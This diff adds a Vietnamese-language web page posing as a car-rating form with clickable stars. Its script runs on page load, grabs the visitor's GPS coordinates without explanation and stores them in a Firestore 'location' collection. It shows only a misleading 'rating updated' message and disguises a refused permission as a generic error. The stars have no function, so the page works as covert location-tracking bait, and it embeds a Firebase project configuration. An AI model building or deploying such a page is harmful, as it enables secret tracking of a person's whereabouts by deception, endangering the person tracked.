@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đánh giá ô tô của bạn</title>
+    <style>
+        /* Đặt font chữ và căn chỉnh toàn trang */
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        /* Khung chính giữa trang */
+        .container {
+            text-align: center;
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+        }
+
+        h1 {
+            font-size: 26px;
+            color: #007BFF;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        /* Thêm biểu tượng ô tô */
+        .icon {
+            font-size: 50px;
+            color: #007BFF;
+            margin-bottom: 20px;
+        }
+
+        /* Thêm hiệu ứng khi đang xử lý */
+        #result {
+            padding: 15px;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        /* Tạo hiệu ứng tải */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Keyframe cho hiệu ứng xoay */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Hệ thống sao đánh giá */
+        .stars {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .star {
+            font-size: 30px;
+            color: #FFD700;
+            margin: 0 5px;
+            cursor: pointer;
+        }
+
+        .star:hover {
+            color: #ff9f00;
+        }
+
+        /* Thông báo thành công */
+        .success {
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+    <script type="module">
+        // Import the functions you need from the SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCPrnIf-vF2_JOf-E8hgtEVOyCq8s1AviY",
+            authDomain: "gknm-b263e.firebaseapp.com",
+            projectId: "gknm-b263e",
+            storageBucket: "gknm-b263e.appspot.com",
+            messagingSenderId: "366058775183",
+            appId: "1:366058775183:web:3f33135f4b1325d542c6fa",
+            measurementId: "G-TWXGN6PJ32"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Get location and save to Firestore
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    document.getElementById("result").innerHTML = 
+                        "Đánh giá đã được cập nhật.";
+
+                    document.getElementById("result").classList.add("success");
+
+                    // Save to Firestore
+                    try {
+                        const docRef = await addDoc(collection(db, 'location'), {
+                            latitude: latitude,
+                            longitude: longitude,
+                            timestamp: serverTimestamp()
+                        });
+                        console.log(`Document written with ID: ${docRef.id}`);
+                    } catch (error) {
+                        console.error("Error adding document: ", error);
+                    }
+                }, showError);
+            } else {
+                alert("Trình duyệt của bạn không hỗ trợ chức năng này.");
+            }
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Có lỗi xảy ra khi xử lý yêu cầu của bạn. Vui lòng thử lại sau.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Dữ liệu hiện không khả dụng. Vui lòng thử lại sau.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Quá trình xử lý bị gián đoạn. Vui lòng thử lại.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Đã xảy ra một lỗi không xác định. Vui lòng thử lại.");
+                    break;
+            }
+        }
+
+        // Automatically get location when the page loads
+        document.addEventListener("DOMContentLoaded", function() {
+            // Khi trang vừa tải, hiển thị hiệu ứng loading
+            document.getElementById("result").innerHTML = 
+                '<div class="loading"></div> Đang xử lý...';
+            getLocation();
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <!-- Biểu tượng ô tô -->
+        <div class="icon">🚗</div>
+        <h1>Đánh giá ô tô của bạn</h1>
+
+        <!-- Hệ thống sao đánh giá -->
+        <div class="stars">
+            <span class="star">★</span>
+            <span class="star">★</span>
+            <span class="star">★</span>
+            <span class="star">★</span>
+            <span class="star">★</span>
+        </div>
+
+        <!-- Kết quả xử lý -->
+        <p id="result">Đang xử lý...</p>
+    </div>
+</body>
+</html>
